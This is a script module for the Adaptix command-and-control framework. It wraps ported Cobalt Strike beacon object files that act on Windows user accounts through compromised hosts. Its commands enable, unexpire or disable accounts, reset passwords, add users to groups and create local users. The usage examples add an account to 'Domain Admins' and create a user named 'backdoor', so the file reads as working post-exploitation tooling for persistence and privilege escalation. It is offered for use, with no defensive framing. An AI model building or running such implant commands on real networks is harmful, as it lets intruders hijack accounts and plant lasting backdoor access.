var metadata = {
    name: "CS-Users-BOF",
    description: "Ported Cobalt Strike CS-Remote-OPs User Account BOFs (prefix: cs_)"
};

/// COMMANDS
//
// Original CS -> Adaptix
//   enableuser     -> cs_enableuser     [USERNAME] [DOMAIN]                       pack "ZZ" -> wstr,wstr  (domain, username)
//   disableuser    -> cs_disableuser    [USERNAME] [DOMAIN]                       pack "ZZ" -> wstr,wstr  (compiled in repo but never wired in .cna; ported here)
//   unexpireuser   -> cs_unexpireuser   [USERNAME] [DOMAIN]                       pack "ZZ" -> wstr,wstr
//   setuserpass    -> cs_setuserpass    [USERNAME] [PASSWORD] [DOMAIN]            pack "ZZZ" -> wstr,wstr,wstr (domain, user, pass)
//   addusertogroup -> cs_addusertogroup [USERNAME] [GROUPNAME] [SERVER] [DOMAIN]  pack "ZZZZ" -> wstr,wstr,wstr,wstr (domain, server, user, group)
//   adduser        -> cs_adduser        [USERNAME] [PASSWORD] [OPT:SERVER]        pack "ZZZ" -> wstr,wstr,wstr (user, pass, server)


// ---------- shared helper for "single wide arg = enable/disable/unexpire" ----------
function make_user_action(name, description, example, bof_stem, task_msg) {
    let cmd = ax.create_command(name, description, example);
    cmd.addArgString("username", true, "Target account name");
    cmd.addArgString("domain",   true, "Domain name for a domain account, or \"\" for a local account on this machine");
    cmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
        let username = parsed_json["username"];
        let domain   = parsed_json["domain"];
        // CS pack "ZZ" order is (domain, username)
        let bof_params = ax.bof_pack("wstr,wstr", [domain, username]);
        let bof_path = ax.script_dir() + "_bin/" + bof_stem + "." + ax.arch(id) + ".o";
        ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, task_msg);
    });
    return cmd;
}

var cmd_enableuser = make_user_action(
    "cs_enableuser",
    "Activate and unlock a user account (local or domain)",
    'cs_enableuser Guest ""',
    "enableuser",
    "Task: cs_enableuser"
);

var cmd_disableuser = make_user_action(
    "cs_disableuser",
    "Disable a user account (local or domain). Note: compiled BOF is included in the CS repo but was never wired into the .cna.",
    'cs_disableuser Guest ""',
    "disableuser",
    "Task: cs_disableuser"
);

var cmd_unexpireuser = make_user_action(
    "cs_unexpireuser",
    "Clear the 'account expired' flag on a user account (local or domain)",
    'cs_unexpireuser jdoe corp.local',
    "unexpireuser",
    "Task: cs_unexpireuser"
);


// ---------- cs_setuserpass ----------
var cmd_setuserpass = ax.create_command(
    "cs_setuserpass",
    "Set a user's password (must meet the GPO complexity policy)",
    'cs_setuserpass jdoe "P@ssw0rd!" corp.local'
);
cmd_setuserpass.addArgString("username", true, "Target account name");
cmd_setuserpass.addArgString("password", true, "New password");
cmd_setuserpass.addArgString("domain",   true, "Domain name or \"\" for a local account");
cmd_setuserpass.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let username = parsed_json["username"];
    let password = parsed_json["password"];
    let domain   = parsed_json["domain"];
    // CS pack "ZZZ" order is (domain, username, password)
    let bof_params = ax.bof_pack("wstr,wstr,wstr", [domain, username, password]);
    let bof_path = ax.script_dir() + "_bin/setuserpass." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: cs_setuserpass");
});


// ---------- cs_addusertogroup ----------
var cmd_addusertogroup = ax.create_command(
    "cs_addusertogroup",
    "Add a user to a group (domain groups only in the upstream BOF)",
    'cs_addusertogroup jdoe "Domain Admins" "" corp.local'
);
cmd_addusertogroup.addArgString("username",  true, "Account to add");
cmd_addusertogroup.addArgString("groupname", true, "Group name (domain groups only)");
cmd_addusertogroup.addArgString("server",    true, "Target computer to perform the addition on, or \"\" for the local machine");
cmd_addusertogroup.addArgString("domain",    true, "Domain name for a domain account, or \"\" for a local account");
cmd_addusertogroup.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let username  = parsed_json["username"];
    let groupname = parsed_json["groupname"];
    let server    = parsed_json["server"];
    let domain    = parsed_json["domain"];
    // CS pack "ZZZZ" order is (domain, server, username, groupname)
    let bof_params = ax.bof_pack("wstr,wstr,wstr,wstr", [domain, server, username, groupname]);
    let bof_path = ax.script_dir() + "_bin/addusertogroup." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: cs_addusertogroup");
});


// ---------- cs_adduser ----------
var cmd_adduser = ax.create_command(
    "cs_adduser",
    "Add a new local user on a machine",
    'cs_adduser backdoor "P@ssw0rd!" SERVER01'
);
cmd_adduser.addArgString("username", true, "New account name");
cmd_adduser.addArgString("password", true, "New account password");
cmd_adduser.addArgString("server",   false, "Optional target machine (defaults to local)");
cmd_adduser.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let username = parsed_json["username"];
    let password = parsed_json["password"];
    let server   = parsed_json["server"] || "";
    // CS pack "ZZZ" order is (username, password, server)
    let bof_params = ax.bof_pack("wstr,wstr,wstr", [username, password, server]);
    let bof_path = ax.script_dir() + "_bin/adduser." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: cs_adduser");
});


/// REGISTER GROUP

var group_cs_users = ax.create_commands_group("CS-Users-BOF", [
    cmd_enableuser,
    cmd_disableuser,
    cmd_unexpireuser,
    cmd_setuserpass,
    cmd_addusertogroup,
    cmd_adduser
]);
ax.register_commands_group(group_cs_users, ["beacon", "gopher", "kharon"], ["windows"], []);
